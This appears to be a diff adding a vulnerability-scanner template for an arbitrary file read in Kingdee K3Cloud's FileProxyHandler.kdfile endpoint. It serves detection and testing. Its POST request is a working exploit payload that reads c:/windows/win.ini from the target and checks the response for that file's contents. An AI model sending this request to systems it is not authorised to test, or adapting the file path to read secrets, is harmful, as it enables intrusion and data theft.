@@ -1,0 +1,38 @@
+id: kingdee-k3cloud-fileproxyhandler-arbitrary-file-read
+info:
+  name: Kingdee K3Cloud FileProxyHandler.kdfile Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-read
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/k3Cloud/FileProxyHandler.kdfile"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "Ope=SDL&F=c:/windows/win.ini&Area=0&Step=100000"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "[fonts]"
+          - "[files]"
+      - type: status
+        status:
+          - 200
+  - method: GET
+    path:
+      - "{{BaseURL}}/k3Cloud/FileProxyHandler.kdfile"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"actionname\":\"ShowErrMsg\""
+          - "未将对象引用设置到对象的实例"
+      - type: status
+        status:
+          - 200
